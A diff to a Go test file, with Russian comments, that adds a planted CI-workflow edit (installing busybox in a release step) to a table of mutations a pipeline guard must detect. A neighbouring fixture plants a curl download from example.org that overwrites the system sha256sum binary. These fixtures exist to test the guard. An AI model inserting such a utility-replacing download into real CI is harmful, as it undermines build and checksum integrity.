@@ -453,6 +453,11 @@ var plants = []plant{
 		wantTest: tenv, wantMsg: "шаги job до go test разошлись", also: []string{pipes, progs}},
 	{name: "rc1-only-in-one-stale", edits: ci("      - name: Версии инструментов (раннер предъявляет себя)\n        # Оба ложных PASS", "      - name: Версии инструментов (2)\n        # Оба ложных PASS"),
 		wantTest: tenv, wantMsg: "запись onlyInOne"},
+	// AU Low-1 (RELEASE-SHELLS раунд 2): шаг из onlyInOne, меняющий окружение
+	// следующих шагов, — исключение ему не положено; правило стережёт подсадка.
+	{name: "rc1-only-in-one-env-release", edits: rel("# ядра 15.09 (п.2, п.3); origin/main — https://github.com/actions/checkout/blob/34e114876b0b11c390a56381ad16ebd13914f8d5/README.md#L7\n        run: |\n          set -euo pipefail\n",
+		"# ядра 15.09 (п.2, п.3); origin/main — https://github.com/actions/checkout/blob/34e114876b0b11c390a56381ad16ebd13914f8d5/README.md#L7\n        run: |\n          set -euo pipefail\n          sudo apt-get install -y busybox\n"),
+		wantTest: tenv, wantMsg: "из onlyInOne меняет окружение", also: []string{progs}},
 	// QA-01 Н1: подмена утилиты загрузкой, под if, только в ci.yml — не
 	// установка пакета, маркеры бы её не узнали; закрытый список шагов — узнаёт.
 	{name: "rc1-qa-curl-tool-ci", edits: ci("      - name: go vet\n", "      - name: Подмена\n        if: matrix.os == 'linux'\n        run: curl -fsSL https://example.org/tool -o /usr/local/bin/sha256sum\n\n      - name: go vet\n"),
